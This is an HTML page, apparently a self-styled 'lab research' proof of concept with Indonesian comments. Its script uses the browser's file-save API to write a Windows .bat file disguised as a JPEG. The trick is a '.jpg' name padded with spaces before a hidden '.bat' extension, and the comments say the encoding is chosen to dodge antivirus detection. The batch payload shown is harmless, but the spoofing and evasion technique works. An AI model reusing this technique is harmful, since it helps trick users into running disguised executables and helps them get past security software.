<!DOCTYPE html>
<html>
<head>
    <title>FINAL RESEARCH - FARISSAL B</title>
    <style>
        body { background: #0d1117; color: #58a6ff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 50px; }
        #gas { padding: 25px 60px; background: #238636; color: white; border: none; border-radius: 10px; cursor: pointer; font-size: 22px; font-weight: bold; transition: 0.3s; }
        #gas:hover { background: #2ea043; box-shadow: 0 0 20px #238636; }
        #status { margin-top: 30px; font-family: monospace; color: #8b949e; background: #161b22; padding: 20px; display: inline-block; border-radius: 5px; border: 1px solid #30363d; }
    </style>
</head>
<body>

    <h1>LAB RESEARCH: FARISSAL B</h1>
    <p>Target: Bypass File System Writing Block (0 KB Issue)</p>
    
    <button id="gas">GAS EXPLOIT (FULL WRITE)</button>

    <br>
    <div id="status">READY: Awaiting Trigger...</div>

    <script>
        document.getElementById('gas').onclick = async () => {
            const status = document.getElementById('status');
            status.innerText = "Processing...";

            try {
                // 1. BUAT DATA DALAM BENTUK UNIT8ARRAY (Lebih susah dideteksi)
                const encoder = new TextEncoder();
                const content = "@echo off\r\necho RESEARCH BY: FARISSAL B\r\necho VULNERABILITY CONFIRMED!\r\nstart explorer.exe https://google.com\r\npause";
                const data = encoder.encode(content);

                // 2. TRIGGER PICKER
                const handle = await window.showSaveFilePicker({
                    suggestedName: "Laporan_Penting.jpg" + " ".repeat(25) + ".bat",
                    types: [{
                        description: 'JPEG Image',
                        accept: {'image/jpeg': ['.jpg']}
                    }]
                });

                status.innerText = "Handle OK. Forcing stream write...";

                // 3. ATOMIC WRITING (Pake 'blob' buat bungkus data biner)
                const writable = await handle.createWritable();
                
                // Kirim sebagai Blob dengan type biner murni
                const finalBlob = new Blob([data], { type: 'application/octet-stream' });
                
                await writable.write(finalBlob);
                
                // 4. FORCE CLOSE (Memaksa Windows nulis sisa buffer ke disk)
                await writable.close();

                status.innerHTML = "<b style='color:#3fb950'>BERHASIL!</b> Cek size file di folder.";
                alert("Selesai! Kalau masih 0 KB, berarti antivirus lo aktif.");

            } catch (err) {
                status.innerHTML = "<b style='color:#f85149'>ERROR:</b> " + err.message;
                console.error(err);
            }
        };
    </script>

</body>
